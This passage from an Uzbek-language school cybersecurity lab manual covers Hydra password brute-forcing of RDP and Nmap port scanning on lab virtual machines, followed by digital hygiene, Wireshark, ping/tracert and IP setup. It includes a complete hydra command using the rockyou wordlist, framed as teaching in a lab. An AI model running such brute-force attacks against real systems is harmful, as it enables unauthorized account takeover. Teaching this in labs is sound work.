+Zaif parollarni aniqlash (Hydra). FTP xizmati uchun zaif parolni aniqlash uchun Windows 10 OT o‘rnatilgan kompyuterga sinov uchun “windows” degan foydalanuvchi yaratib, unda zaif “qwerty” parolini qo‘yamiz va “Параметры” bo‘limidan “Удаленный рабочий стол” funksiyasini yoqib qo‘yamiz (1.23-rasm).
+
+1.22-rasm. VirtualBoxda 3 ta virtual mashinani yaratish va tarmoqni sozlash
+
+1.23-rasm. Windows OT sozlamalari
+Endi Hydra dasturini ishlatish uchun Kali Linux OT terminaliga quyidagi buyruq kiritiladi va zaif parolni aniqlash jarayoni boshlanadi (1.24-rasm):
+hydra -l windows -P /usr/share/wordlists/rockyou.txt -t 4 -V -f rdp://172.16.4.65
+Ko‘rinib turibdiki, parol sodda bo‘lganligi sababli dastur uni aniqlashga ko‘p vaqt sarflamadi (1.24-rasm).
+Nmap bilan ochiq portlarni aniqlash. Kali OTda Nmap vositasi ishga tushiriladi va Ubuntu server OT skaner qilinadi (1.25-rasm). Buning uchun Kali OTda terminal ochilib quyidagi buyruq kiritiladi:
+sudo nmap -sV -p- --open 172.16.4.65
+So‘rov natijasi 172.16.4.65 IP manzilida joylashgan tizimning barcha ochiq portlarini qidiradi. IP manzil o‘rniga domen nomini ham kiritish mumkin.
+
+1.24-rasm. Zaif parolni aniqlash jarayoni
+
+1.25-rasm. Skanerlash natijasi
+Ushbu laboratoriya ishida oddiy tizim tekshiruvi (Nmap + Hydra) yordamida tarmoqdagi eng keng tarqalgan zaifliklar, ochiq portlar va zaif parollar tezkor aniqlanishi ko‘rib o‘tildi. Topilgan zaifliklar real hayotdagi ko‘plab tizimlarda ham uchraydi va ular orqali tajovuzkor bir necha daqiqa ichida to‘liq nazoratni qo‘lga kiritishi mumkin.
+	O‘z laboratoriya muhitingizda 2 ta virtual mashinani (Ubuntu yoki Windows) skanerlab, kamida 5 ta ochiq port va 2 ta zaif parolni toping.
+	•	Topilgan zaifliklar uchun himoya choralarini jadvalda ko‘rsating va hisobot tayyorlang.
+	•	Nmap va Hydra natijalarini .txt faylga saqlab, skrinshotlar bilan birga taqdim eting.
+Amaliy topshiriqlar
+
+
+	•	O‘z laboratoriya muhitingizda 2 ta virtual mashinani (Ubuntu yoki Windows) skanerlab, kamida 5 ta ochiq port va 2 ta zaif parolni toping.
+	•	Topilgan zaifliklar uchun himoya choralarini jadvalda ko‘rsating va hisobot tayyorlang.
+	•	Nmap va Hydra natijalarini .txt faylga saqlab, skrinshotlar bilan birga taqdim eting.
+Amaliy topshiriqlar
+
+
+
+1.4. Raqamli gigiena va ijtimoiy media xavfsizligi
+O‘quvchilarda xavfsiz ko‘rish, parol yaratish va ijtimoiy media xavfsizligi odatlarini o‘rgatish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda xavfsiz ko‘rish, parol yaratish va ijtimoiy media xavfsizligi odatlarini o‘rgatish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Google Chrome yoki Mozilla Firefox brauzeri;
+	•	Telegram messenjeri.
+	•	Shaxsiy kompyuter;
+	•	Google Chrome yoki Mozilla Firefox brauzeri;
+	•	Telegram messenjeri.
+Ishning bajarish tartibi
+Raqamli gigiena - bu internet va elektron qurilmalarda shaxsiy maʼlumotlarni himoya qilish uchun amal qilinadigan oddiy va muntazam odatlar hisoblanadi. Masalan, murakkab parollarni ishlatish, shubhali linklarni bosmaslik, ijtimoiy tarmoqlarda maxfiylikni sozlashni amalga oshirish shular jumlasidan. 
+Shuning uchun har bir foydalanuvchi quyidagi 4 ta asosiy qoidaga amal qilishi talab etiladi:
+	•	Faqat HTTPS aloqdan foydalanish, reklama va kuzatish xuzmatlarini bloklash.
+	•	Har bir sayt uchun alohida, kuchli parol va parol menejeridan foydalanish.
+	•	Barcha muhim joylarda 2 bosqichli autentifikatsiyadan foydalanish.
+	•	Ijtimoiy tarmoqlarda shaxsiy ma’lumotlarni minimal darajada oshkor etish.
+Xavfsiz brauzerni tayyorlash (Google Chrome yoki Firefox). Buning uchun brauzerni ochib, quyidagi 4 ta kengaytmani o‘rnatish lozim:
+	•	HTTPS Everywhere – barcha saytlarni majburan shifrlangan (HTTPS) holatga o‘tkazish uchun.
+	•	uBlock Origin – reklama, treker va zararli skriptlarni bloklash uchun.
+	•	Cookie AutoDelete – saytdan chiqqanda kukilarni avtomatik o‘chirish uchun.
+	•	ClearURLs – havolalardagi trekerlarni tozalash uchun.
+
+1.26-rasm. Kerakli dasturlarni qidirish
+
+1.27-rasm. Kerakli dasturlarni o‘rnatish jarayoni
+Ushbu qo‘shimcha dasturlarni o‘rnatish uchun https://chromewebstore.google.com/ manziliga kirib qidiruv joyiga dasturlarni nomini kiritish (1.26-rasm) hamda dasturni topib, “Chrome brauzeriga o‘rnatish” tugmasini bosish lozim (1.27-rasm).
+Qolgan dasturlar ham shunday tartibda brauzerga o‘rnatib olinadi (1.28-rasm).
+
+1.28-rasm. 4 ta dasturni o‘rnatilgani va faol holatda turgani
+DNS xizmatini xavfsiz qilish. Buning uchun https://1.1.1.1/help saytiga kiriladi (1.29-rasm). Tarmoq adapterini ham DNS bandini 1.1.1.1 va 1.0.0.1 qilib sozlash lozim (1.30, 1.31-rasmlar). Ushbu jarayonlar amalga oshirilgandan keyin Internet-provayder foydalanuvchi qaysi saytlarga kirayotganini ko‘ra olmaydi.
+
+1.29-rasm. https://1.1.1.1/help saytiga kirish
+
+1.30-rasm. DNS sozlamalarini amalga oshirish
+
+1.31-rasm. https://1.1.1.1/help sahifasida “Yes” yozuvi
+Kuchli paroldan foydalanish. Kuchli parollarni yaratishda quyidagilarga e’tibor qaratish lozim:
+	•	kamida 12 ta belgidan iborat boʻlishi zarur;
+	•	katta va kichik harflar, raqamlar va maxsus belgilar aralashmasidan foydalanish (masalan: A, a, 9, !), misol uchun “Maktab@2025!Uz”;
+	•	oddiy soʻz yoki ism ishlatilmasin (masalan: password, 123456);
+	•	har bir sayt yoki xizmat uchun turli parollardan foydalanish kerak;
+	•	parol menejerlaridan (LastPass, Bitwarden) foydalanish foydali hisoblanadi.
+Kuchli parolni hosil qilish yoki tekshirish uchun “Kaspersky password checker” xizmatidan foydalanish mumkin (1.32-rasm).
+
+1.32-rasm. Tasodifiy kuchli parolni hosil qilish
+Agar parol menejerlaridan foydalanilsa har bir sayt uchun alohida 20-25 belgili tasodifiy parol yaratadi va faqat foydalanish uchun yagona bosh parolni eslab qolish yetarli hisoblanadi.
+Eski parollarni buzilgan yoki yo‘qligini tekshirish uchun haveibeenpwned.com saytidan foydalanish mumkin (1.33-rasm).
+
+1.33-rasm. haveibeenpwned.com da tekshirilgan parol natijasi
+Ijtimoiy mediada amal qilinishi lozim bo‘lgan xavfsizlik odatlari (Telegram misolida)
+Telegramda shaxsiy ma’lumotlarni himoyalash juda oson va tezkor. Buning uchun quyidagi 5 ta qadamni ketma-ket bajarib chiqish yetarli:
+1-qadam. “Maxfiy hisob” shaklida belgilash (faqat tasdiqlangan odamlar yozishi mumkin). Buning uchun quyidagilar bajariladi:
+	•	Telegram → Sozlamalar → Maxfiylik va xavfsizlik → Maxfiylik.
+	•	Telefon raqamim → “Mening kontaktlarim” yoki “Hech kim”.
+	•	Oxirgi faol vaqtim → “Mening kontaktlarim”.
+	•	Profil rasmi va ismim → “Mening kontaktlarim”.
+	•	Forward qilingan xabarlarda havolani yashirish → Yoqish.
+
+1.34-rasm. Maxfiylik bo‘limi – telefon raqami va oxirgi faol vaqt yashirilgan
+2-qadam. Ikki bosqichli autentifikatsiyani (2FA) yoqish. Buning uchun quyidagilar bajariladi (1.35-rasm):
+	•	Telegram → Sozlamalar → Maxfiylik va xavfsizlik → Ikki bosqichli autentifikatsiya;
+	•	“Parolni o‘rnatish” → Kuchli parolni kiriting (kamida 12 belgi);
+	•	Takrorlang → Eslatma so‘ralsa yoziladi;
+	•	E-mail qo‘shing (ixtiyoriy, lekin tavsiya etiladi).
+
+1.35-rasm. Ikki bosqichli tekshiruv yoqilganligi
+
+1.36-rasm. Faol seanslar ro‘yxati ochiq, faqat o‘z telefon va kompyuteringiz qolgan, boshqa qurilmalar “tugatilgan” holatda
+3-qadam. Faol seanslarni tekshirish va noma’lum qurilmalarni chiqarish. Buning uchun quyidagilar bajariladi (1.36-rasm):
+	•	Telegram → Sozlamalar → Qurilmalar (yoki “Faol seanslar”);
+	•	Barcha qurilmalarni ko‘ring;
+	•	O‘zingizga tegishli bo‘lmaganlarni bosing → “Seansni tugatish” tugmasini bosing.
+4-qadam. Guruh va kanallarda qo‘shilishni cheklash. Buning uchun quyidagi amalyotlar bajariladi:
+	•	Telegram → Sozlamalar → Maxfiylik va xavfsizlik;
+	•	Meni guruhlarga kim qo‘shishi mumkin → “Mening kontaktlarim”;
+	•	Meni kanallarga kim qo‘shishi mumkin → “Mening kontaktlarim”.
+
+1.37-rasm. Guruh va kanallarga qo‘shish “Mening kontaktlarim” holatida (lekin xohlasangiz “Hech kim” qo‘yishingiz mumkin)
+5-qadam. Xabarlarni avtomatik o‘chirish (ixtiyoriy, lekin juda foydali). Buning uchun quyidagilar bajariladi:
+	•	Telegram → Sozlamalar → Maxfiylik va xavfsizlik → Xabarlarni avtomatik o‘chirish;
+	•	1 oy yoki 1 yil qilib qo‘ying.
+
+1.38-rasm. Avtomatik o‘chirish 1 oy qilib qo‘yilgani
+Ushbu jarayonlar bajarilgach, Telegram akkauntingiz 95% hujumlardan himoyalangan bo‘ladi. Xuddi shunday Instagram, TikTok va Facebook ijtimoiy tarmog‘larida ham sozlanishlarni o‘rnatish mumkin.
+		O‘z kompyuteringizda xavfsiz brauzerni tayyorlang va DNS ni o‘zgartirish amalyotlarini bajaring.
+	•	Kuchli parollar yarating va parol menejeridan foydalaning hamda bu bo‘yicha hisobot tayyorlang.
+	•	Ijtimoiy tarmoqlardan foydalanishni to‘liq xavfsiz qilish amaliyotlarini bajaring (Instagram yoki Facebook misolida).
+Amaliy topshiriqlar
+
+
+	•	O‘z kompyuteringizda xavfsiz brauzerni tayyorlang va DNS ni o‘zgartirish amalyotlarini bajaring.
+	•	Kuchli parollar yarating va parol menejeridan foydalaning hamda bu bo‘yicha hisobot tayyorlang.
+	•	Ijtimoiy tarmoqlardan foydalanishni to‘liq xavfsiz qilish amaliyotlarini bajaring (Instagram yoki Facebook misolida).
+Amaliy topshiriqlar
+
+
+II BOB. KOMPYUTER TARMOQLARI VA INTETNET XAVFSIZLIGI
+
+
+II BOB. KOMPYUTER TARMOQLARI VA INTETNET XAVFSIZLIGI
+
+
+
+
+
+
+2-bob haqida umumiy ma'lumot
+Ushbu bobda tarmoq tushunchasi, uning turlari, tarmoq qatlamlarini o'rganish, kuzatuvchi marshrutlar, IP sozlamalari, tarmoqlararo ekran vositalari, VPN aloqalari va tarmoq hujumlarini simulyatsiya qilish ko'nikmalarini shakllantirish, Wireshark, traceroute/ping buyruqlari va VPN o'rnatish, tarmoq protokollarini tahlil qilish, himoya choralarini amalga oshirish va hujumlardan himoyalanish kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.
+
+2.1. Wireshark bilan tarmoq paketlarini tahlil qilish
+O‘quvchilarda Wireshark yordamida paketlarni kuzatish va protokollarni aniqlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda Wireshark yordamida paketlarni kuzatish va protokollarni aniqlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Wireshark dasturi.
+	•	Shaxsiy kompyuter;
+	•	Wireshark dasturi.
+Ishning bajarish tartibi
+Internetdagi har bir harakat (sayt ochish, video ko‘rish, ping buyrug‘ini jo‘natish) minglab paketlardan iborat. Paketlar ichida manzillar (IP), qaysi protocol foydalanilgani (TCP/UDP/ICMP), ma’lumot (data) kabilar bo‘ladi. Har bir paket OSI modelining 7 ta sathidan o‘tadi:
+	•	Fizik sath;
+	•	Kanal sathi (Ethernet, MAC-manzillar);
+	•	Tarmoq sathi (IP-manzillar, marshrutlash);
+	•	Transport sathi (TCP/UDP, portlar);
+	•	Seans sathi;
+	•	Taqdimot sathi;
+	•	Tadbiqiy sath (HTTP, DNS, HTTPS va boshqalar).
+Wireshark bu paketlarni “ushlab” olib, har bir qatlamini ochib ko‘rsatadi. Wireshark tarmoqda har bir paketni kuzatish, filtrlash va tahlil qilish uchun eng mashhur bepul vositalardan hisoblanadi.
+Ishni bajarish ketma-ketligi quyidagidan iborat:
+1-qadam. Wireshark o‘rnatish:
+	•	https://www.wireshark.org saytiga kiriladi;
+	•	“Download” tugmasi bosilib, Windows yoki macOS OT uchun versiya tanlanadi;
+	•	O‘rnatish jarayonida “WinPcap/Npcap” ni ham o‘rnatishga ruxsat berish zarur (majburiy);
+	•	O‘rnatib bo‘lgach, Wireshark ishga tushiriladi natijada Wireshark asosiy oynasi ochiladi (2.1-rasm).
+
+2.1-rasm. Wiresharkning birinchi ochilgan oynasi
+2-qadam. Interfeysni tanlash va captureni boshlash:
+	•	Ochilgan oynada interfeyslar ro‘yxati chiqadi (Wi-Fi, Ethernet, Loopback);
+	•	Faol internetga ulangan interfeys yonida yashil grafik chiziq bo‘ladi uni ustiga ikki marta bosiladi;
+
+2.2-rasm. Capture ishlayotgani, paketlar oqimi
+	•	Yuqoridagi ko‘k “shark” belgisini (Start capturing packets) bosiladi.
+Natijada oyna to‘lgan holda paketlar tezkor oqib o‘ta boshlaydi (soniyada 100-1000 ta).
+Rasmning 1-qismi yuqori panel - paketlar roʻyxati (No., Time, Source, Destination, Protocol, Length, Info) hisoblanadi. 2-qismi ya’ni oʻrta panel - paketning protokol bo‘limlari, tanlangan paketning Ethernet, IP, TCP/UDP va tadbiqiy sath (HTTP, DNS) sarlavhalari ierarxik ko‘rinishi. Har bir qatorni kengaytirib batafsil maʼlumot olish mumkin (masalan: TCP bayroqlar: SYN, ACK). 3-qismi esa pastki panel: Hex + ASCII, tanlangan paketning 16 lik sanoq tizimidagi ko‘rinishi (hex) va uning ASCII ko‘rinishi. Agar login/parol kattaliklari HTTP orqali uzatilsa, shu yerda ochiq ko‘rinadi.
+3-qadam. Oddiy HTTP sayt ochish. 
+Brauzerda http://example.com sayt ochiladi va Wiresharkda tutib olish (capture) to‘xtatiladi (qizil kvadrat). Filtr maydoniga http deb yoziladi va Enter tugmasi bosiladi. HTTP GET (yoki POST) so‘rovi topilib, paketni ustiga bosiladi va pastda “Packet Details” bandi ochiladi (2.3-rasm). Demak, internetda sayt ochganda brauzer serverga “GET” so‘rovi jo‘natadi. Bu 7-sathda (Application) amalga oshiriladi.
+
+2.3-rasm. HTTP POST so‘rovi ochiq holda (Packet Details)
+
+2.4-rasm. HTTPS aloqasi boshlanishi – TLS Client Hello
+4-qadam. HTTPS sayt ochish
+Paketni tutib olish (Capture) qayta ishga tushuriladi va brauzerda birorta https sayt ochiladi. To‘xtatish (Stop) tugmasi bosilib, jarayon to‘xtatiladi va filtrga tls deb yozilib, “Enter” tugmasi bosiladi. Natijada “TLS Handshake” protokolini ko‘rish mumkin, ya’ni aloqa shifrlangan ko‘rinishda davom etadi (2.4-rasm). Demak, ma’lumotlar shifrlanadi, uni hech kim o‘rtada turib o‘qiy olmaydi.
+
+2.5-rasm. Protokollar bo‘yicha paketlarni tahlil qilish
+Xuddi shu holatda qolgan paketlarni (TCP, UDP, DNS, ICMP) ham tahlil qilish mumkin (2.5-rasm).
+Shundan so‘ng, o‘quvchilar nafaqat “sayt ochdim” deydi, balki “brauzer DNS so‘rov jo‘natdi, TCP handshake amalga oshirildi, TLS shifrlanishi boshlandi, HTTP GET so‘rovi yuborildi” deb aniq tushuntira oladi va bu kiberxavfsizlik mutaxassisi bo‘lish uchun eng muhim ko‘nikmalardan hisoblanadi.
+
+	O‘z kompyuteringizda Wiresharkni o‘rnating va interfeys tanlash amalyotlarini bajaring.
+	•	Har bir protokol bo‘yicha kamida 3 tadan paketlarni tahlil qiling.
+	•	Har bir protokol bo‘yicha tanlangan paketlarni tahlil natijalarini fayl ko‘rinishida saqlab, hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	O‘z kompyuteringizda Wiresharkni o‘rnating va interfeys tanlash amalyotlarini bajaring.
+	•	Har bir protokol bo‘yicha kamida 3 tadan paketlarni tahlil qiling.
+	•	Har bir protokol bo‘yicha tanlangan paketlarni tahlil natijalarini fayl ko‘rinishida saqlab, hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+2.2. Ping va traceroute buyruqlari bilan tarmoqni tahlil qilish
+O‘quvchilarda internet manzillarini ko‘rish uchun tracerout/ping buyruqlaridan foydalanish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda internet manzillarini ko‘rish uchun tracerout/ping buyruqlaridan foydalanish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Powershell dasturi.
+	•	Shaxsiy kompyuter;
+	•	Powershell dasturi.
+Ishning bajarish tartibi
+Internet – bu millionlab marshrutizatorlardan (router) iborat ulkan tarmoqdir. 
+Ping buyrug‘i tarmoqdagi boshqa qurilmaga kichik “echo” paketini yuboradi va u javob qaytargan vaqtni (RTT, Round-trip time) o‘lchaydi. Ping buyrug‘i bilan:
+	•	qurilma tarmoqda faol yoki faol emasligini tekshirish mumkin;
+	•	javob vaqti (latency) va paket yo‘qolishini (packet loss) ham ko‘rish mumkin.
+Traceroute / tracert — yuborilgan paketlar internet bo‘ylab qanday yo‘l (hop) bilan borishini ko‘rsatadi. Har bir “hop” router yoki marshrutlovchi bo‘lib, u paketlarni keyingi bosqichga yuboradi. Traceroute har bir hop uchun javob vaqti (odatda 3 marta o‘lchanadi) va hop IP/host nomini ko‘rsatadi. Bu quyidagilarni aniqlashda yordam beradi:
+	•	qaysi yo‘nalishda kechikish (latency) borligini;
+	•	tarmoqdagi muammo qayerda ekanini (masalan, bitta hopda juda katta kechikish yoki paket yo‘qolishi).
+Ishni bajarish ketma-ketligi quyidagicha:
+1-qadam. CMD (Windows) yoki Terminal (Linux/Mac) ochish
+Windows OT CMD ochish uchun Win+R tugmalari bir vaqtda bosilib, chiqqan oynaga cmd deb yozib Enter tugmasi bosiladi (2.6-rasm).
+
+2.6-rasm. Ochilgan CMD/Terminal oynasi
+2-qadam. Oddiy ping buyrug‘ini bajarish
+“google.com” va “daryo.uz” sayti bilan shaxsiy kompyuter o‘rtasida aloqa bor yoki yo‘qligini, paketlarning borib kelish vaqtini ko‘rish uchun terminalga quyidagi buyruq yoziladi va Enter tugmasi bosiladi (2.7-rasm).
+ping google.com (yoki IP manzil)
+ping daryo.uz (yoki IP manzil)
+
+2.7-rasm. Ping natijalari
+Xo‘sh bu jarayon va natijadan nimani tushunish mumkin: google.com uchun
+	•	Google serveriga borib-kelish o‘rtacha 163 millisekund (ya’ni 0.163 soniya) vaqt talab etilmoqda.  Bu vaqt ancha katta bo‘lib, odatda O‘zbekistondan Google serverlariga 30-60 ms vaqt olinishi kerak. Bu natijadan paketlarni Yevropa yoki Rossiya orqali aylanib kelayotganini taxmin qilish mumkin.
+	•	0% yo‘qotish – barcha xabarlar yetib bordi va javob qaytdi. Shuning uchun Internetga ulanishni sekin bo‘lsada, barqaror deb aytish mumkin.
+	•	TTL=105 – paket yo‘lda 23 ta marshrutizatordan (hopdan) o‘tgan (128-105=23). Server Windows OT bo‘lganida TTL ni 128 qilib jo‘natadi (Linux OT uchun 64 ga teng).
+daryo.uz sayti uchun:
+	•	o‘rtacha vaqt 14 ms, ya’ni juda tez. Server O‘zbekistonning ichida yoki yaqinida ekanligini ko‘rsatadi. 
+	•	Bitta paket yo‘qoldi (25% yo‘qotish) – bu server yoki provayder tomonidan ICMP bloklangan bo‘lishi mumkinligini ko‘rsatadi (ko‘p mahalliy saytlar ping buyrug‘iga javob bermaydi). Bu xavfli holat hisoblanmaydi, faqat sayt “men tirikman” degan xabarga javob bermayotganini ko‘rsatadi.
+	•	TTL=110 – paket yo‘lda 18 ta hopdan o‘tgan.
+Yuqoridagi natija ping buyrug‘i orqali olingan bo‘lib, u IPv4 protokol uchun ishlaydi. Agar IPv6 tarmog‘ida foydalanish talab etilsa, ping6 buyrug‘idan foydalanish kerak bo‘ladi.
+3-qadam. Traceroute bajarish (Windows – tracert, Linux/Mac – traceroute)
+Windows+R tugmasi bosilib, cmd ishga tushuriladi. Tracert buyrug‘ini kiritib, soʻngra kuzatmoqchi boʻlgan domen yoki IP manzil kiritiladi:
+tracert google.com
+tracert daryo.uz
+Shundan so‘ng kuzatuv natijalari ko‘rsatila boshlaydi. Ularda ulanish uchun manzilga boradigan yo‘llar ko‘rsatiladi (2.8-rasm).
+Endi olingan natijalarni tahliliga o‘tamiz: google.com
+1.  172.16.4.1       → Sizning routeringiz (uyingizdagi Wi-Fi router);
+2.  195.158.2.217 → Mahalliy provayder (Toshkent yoki viloyat uzeli);
+3.  10.0.78.49       → Provayder ichidagi marshrutizator;
+4.  10.32.2.14        → Yana provayder ichidagi nuqta;
+5. 84.54.64.157 → O‘zbekistonning asosiy internet uzeli (TAS-IX yoki UzTelecom);
+6.  84.54.64.141     → Yana O‘zbekiston ichidagi nuqta;
+7.  84.54.64.13       → O‘zbekistondan chiqish nuqtasi;
+8.  195.69.189.250 → Rossiya yoki Yevropa tranzit uzeli;
+9.   195.69.189.33   → Yana transit uzel;
+10. 195.69.189.105 → Google tarmog‘iga kirish nuqtasi (Frankfurt yoki London atrofida);
+11.  142.251.65.75   → Google serverlari yaqinida;
+12.  142.251.241.77 → Google ichidagi marshrutizator;
+13.  1cfraa-bt-in-f14.1e100.net [142.251.140.174] → Google serverining o‘zi.
+
+2.8-rasm. tracert so‘rovi natijalari
+Paketlar jami 13 ta bosqichda, o‘rtacha vaqt 100 ms atrofida manziliga yetib bordi. Bu odatiy holat bo‘lib, O‘zbekistondan Google serveriga har doim 10-15 ta bosqich talab etiladi.  
+daryo.uz gacha yo‘l:
+	•	1 – 4 → Uy routeri + provayder ichida (oddiy);
+	•	5 – 18 → * * * (barcha marshrutizatorlar ICMP ga javob bermadi);
+	•	19 → mail.dgvcloud.uz [93.188.84.188] → Daryo.uz server.
+Daryo.uz serveri O‘zbekiston hududida joylashgan bo‘lsada, yo‘ldagi marshrutizatorlarning deyarli hammasi “men bu yerdaman” degan javobni qaytarmagan (bu oddiy holat bo‘lib, ko‘p provayderlar traceroute so‘rovini bloklashi bilan izohlanadi).
+Oxirgi hopda serverning o‘zi javob bergani bois, undan server faol va yaqin joyda ekanligini bilish mumkin.
+Buyruqlarning harakatini o‘zgartirish uchun bir nechta variantlardan ham foydalanish mumkin. Tracert uchun eng keng tarqalgan flaglar 2.1-jadvalda keltirilgan.
+2.1-jadval
+Tracert uchun eng keng tarqalgan flaglar
+Flag (buyruq qo‘shimchasi)
+Nimani aniqlaydi?
+Qachon foydalaniladi?
+Misol
+Natija qanday bo‘ladi?
+-d
+DNS nomlarini izlamaydi (faqat IP ko‘rsatadi)
+Tezlik talab etilganda, DNS sekin ishlasa
+tracert -d google.com
+google.com → 142.250.185.78 deb darhol chiqadi, “Resolving host…” degan kutish bo‘lmaydi
+-h 15 (yoki boshqa raqam)
+Maksimal hop (marshrutizator) sonini belgilaydi (standart 30)
+Uzoq serverlarga borayotganda (masalan, Avstraliyaga)
+tracert -h 20 facebook.com
+20 ta hopdan keyin to‘xtaydi, agar yetib bormasa “Request timed out” chiqadi
+-w 1000 (yoki boshqa ms)
+Har bir hopga kutish vaqtini o‘zgartiradi (standart 4000 ms = 4 sekund)
+Internet sekin bo‘lsa, javob uzoq kelsa
+tracert -w 1000 yandex.ru
+Har bir hopga faqat 1 sekund kutadi, tezroq natija beradi
+-4
+Faqat IPv4 ishlatadi (IPv6 ni o‘chiradi)
+IPv6 bilan muammo bo‘lsa
+tracert -4 google.com
+Faqat IPv4 manzillar ko‘rinadi
+-6
+Faqat IPv6 ishlatadi
+IPv6 tarmog‘i borligini sinab ko‘rish uchun
+tracert -6 google.com
+IPv6 manzillar (uzun raqamlar) chiqadi
+
+2.9-rasm. Eng ko‘p ishlatiladigan tracert kombinatsiyalari
+	Har bir o‘quvchi tomonida 4 ta turli saytga ping va tracert buyruqlari yuborilsin.
+	•	Tezlikni oshirish uchun tegishli flaglardan foydalanilsin.
+	•	Olingan natijalarni jadvalga joylashtirgan holda hisobot tayyorlansin.
+Amaliy topshiriqlar
+
+
+	•	Har bir o‘quvchi tomonida 4 ta turli saytga ping va tracert buyruqlari yuborilsin.
+	•	Tezlikni oshirish uchun tegishli flaglardan foydalanilsin.
+	•	Olingan natijalarni jadvalga joylashtirgan holda hisobot tayyorlansin.
+Amaliy topshiriqlar
+
+2.3. IP-manzillash va qism tarmoqlar (subnets)
+O‘quvchilarda lokal tarmoqda statik va dinamik IP sozlanmalarini bajarish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda lokal tarmoqda statik va dinamik IP sozlanmalarini bajarish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Windows operatsion tizimi;
+	•	Tarmoq sozlamalari uchun terminal va grafik interfeys.
+	•	Shaxsiy kompyuter;
+	•	Windows operatsion tizimi;
+	•	Tarmoq sozlamalari uchun terminal va grafik interfeys.
+Ishning bajarish tartibi
+Kompyuterlar lokal yoki global tarmoqda bir-biri bilan muloqot qilishi uchun IP manzilga ega bo‘lishi kerak. IP manzil qurilmaning tarmoqdagi “uy manzili” bo‘lib, unga ma’lumot paketlari yo‘naltiriladi. IP ikki xil usulda berilishi mumkin: statik (qo‘lda) yoki dinamik (DHCP orqali).
+Statik IP — bu administrator tomonidan qo‘lda o‘rnatiladigan va o‘zgarmaydigan IP manzil. Qurilma qayta yuklanishi yoki tarmoqdan uzilib-qo‘shilishi IP manzilni o‘zgartirmaydi.
+Statik IP manzillar quyidagi afzalliklarga ega:
+	•	Doimiy manzilga ega bo‘ladi: bir xil IP doimo ishlaydi.
+	•	Serverlar uchun juda muhim: web-server, FTP-server, kamera tizimi va printerlar doimiy IP orqali ishlaydi.
+	•	Masofadan ulanish oson: RDP, SSH kabi xizmatlar uchun qulay.
+	•	Tarmoqni boshqarish yengil: administrator qurilmalarni tez topadi.
+Kamchiliklari:
+	•	Qo‘lda sozlash ko‘proq vaqt talab qiladi.
+	•	Katta tarmoqlarda yuzlab qurilmalarga statik IP berish juda murakkab.
+	•	Noto‘g‘ri IP kiritilsa, qurilma tarmoqqa ulana olmaydi.
+Statik IP manzillar web-serverlar, DHCP/DNS serverlar, printerlar va videokuzatuv kameralari, router va switch kabi tarmoq qurilmalari, masofaviy foydalanish tashkil qilinadigan kompyuterlarda qo‘llaniladi.
+Dinamik IP (DHCP) — bu DHCP server tomonidan avtomatik tarzda beriladigan IP manzil. Qurilma tarmoqqa ulangan zahoti IP, gateway va DNS manzillari avtomatik ravishda olinadi.
+Dinamik IP manzillar quyidagi afzalliklarga ega:
+	•	Eng qulay usul: foydalanuvchi hech narsa sozlamaydi.
+	•	Xatoliklar kamayadi: IP to‘qnashuvi (bir xil IP ikki qurilmada) bo‘lmaydi.
+	•	Katta tarmoqlar uchun ideal: yuzlab qurilmalarga avtomatik IP tarqatadi.
+	•	Qurilmalar ulanishi tez va oson.
+Kamchiliklari:
+	•	IP manzil har safar o‘zgarishi mumkin.
+	•	IP doimiy emasligi bois masofadan ulanish (RDP, SSH) qiyinlashadi.
+Dinamik IP manzillar maktab va universitet tarmoqlari, ofis va uy Wi-Fi tarmoqlari, o‘quv kompyuterlari, telefonlar, noutbuklar hamda mehmon tarmoqlari (Guest Wi-Fi) uchun qo‘llaniladi.
+Windows OT IP manzillarni sozlash:
+1. Boshqaruv paneliga kirish
+Windows OT qidiruv paneliga “ncpa.cpl” deb kiritiladi va Enter tugmasi bosiladi.
+
+Agar siz Windows 10 OTdan foydalanmasangiz, uning o‘rniga quyidagi amallarni bajaring:
+	•	klaviaturada “Windows” va “R” tugmachalarini bir vaqtning o‘zida bosing.
+	•	ochilgan oynada “ncpa.cpl” ni kiriting (2.10-rasm).
+
+2.10-rasm. Windows tizimining ish vaqti interfeysi
+Natijada tarmoq ulanishlari hozirda kompyuteringizga ulangan tarmoq adapterlarini ko‘rsatadi (2.11-rasm).
+
+2.11-rasm. Qurilmaga ulangan tarmoq adapterlari
+2. Tarmoq adapterini tanlash
+Sozlamoqchi bo‘lgan qurilmaga ulangan tarmoq adapterini o‘ng tugmasi bosiladi. Odatda, bu nomda “Ethernet” so‘zi bo‘lgan adapter bo‘ladi. Ochilgan menyudan “Properties” bandi tanlanadi (2.12-rasm).
+
+2.12-rasm. Properties bo‘limiga o‘tish
+3. Internet protokolining 4-versiyasini tanlash (TCP/IPv4)
+“Internet Protocol Version 4 (TCP/IPv4)” ustiga ikki marta bosiladi (2.13-rasm). 
+
+2.13-rasm. “Internet Protocol Version 4 (TCP/IPv4)” bo‘limiga o‘tish
+Keyin “Use the following IP address” tanlanadi va tegishli maydonlarga quyidagi ma’lumotlar kiritiladi:
+	•	IP-manzil: IP-manzil uchun ulanayotgan qurilmangizni tekshiring. Bunda birinchi uchta raqam mos kelishi kerak. Masalan: 192.168.10.10 IP manzilidan foydalanish mumkin.
+	•	Subnet Mask: Siz ulanmoqchi bo‘lgan qurilma orasidagi ichki tarmoq maskasi shaxsiy kompyuteringiz bilan bir xil bo‘lishi kerak. Masalan: 255.255.255.0 pastki tarmoq maskasidan foydalanish mumkin.
